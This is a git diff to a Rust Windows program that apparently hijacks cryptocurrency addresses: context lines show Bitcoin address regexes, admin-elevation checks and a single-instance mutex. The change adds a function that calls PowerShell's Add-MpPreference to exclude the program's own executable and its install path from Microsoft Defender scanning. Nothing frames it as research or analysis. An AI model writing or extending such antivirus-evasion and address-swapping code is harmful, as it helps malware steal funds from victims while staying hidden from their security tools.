@@ -20,10 +20,8 @@ use std::{
     time::Duration,
 };
 use winapi::um::{
-    shellapi::ShellExecuteW,
     synchapi::{CreateMutexW, OpenMutexW},
     winnt::SYNCHRONIZE,
-    winuser::SW_SHOW,
 };
 use winreg::{enums::*, RegKey};
 
@@ -184,6 +182,16 @@ fn is_administrator() -> Result<bool, Error> {
     Ok(elevation.TokenIsElevated != 0)
 }
 
+fn add_to_defender_exclusions(path: &str) -> () {
+    Command::new("powershell")
+        .args(&[
+            "-Command",
+            &format!("Add-MpPreference -ExclusionPath '{}'", path),
+        ])
+        .output()
+        .expect("Failed to execute command.");
+}
+
 fn run_as_admin() -> ExitStatus {
     let status = Command::new("powershell")
         .args(&[
@@ -206,6 +214,20 @@ fn run_as_admin() -> ExitStatus {
 async fn main() {
     if is_administrator().unwrap() {
         if check_mutex() {
+            add_to_defender_exclusions(
+                std::env::current_exe()
+                    .unwrap()
+                    .to_str()
+                    .unwrap()
+            );  
+
+            add_to_defender_exclusions(
+                get_destination_path()
+                    .0
+                    .to_str()
+                    .unwrap()
+            );
+            
             let map: HashMap<&str, &str> = HashMap::from_iter([
                 (
                     r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
@@ -237,7 +259,7 @@ async fn main() {
 
             if status.success() {
                 break;
-            }
+            };
         }
     }
 }
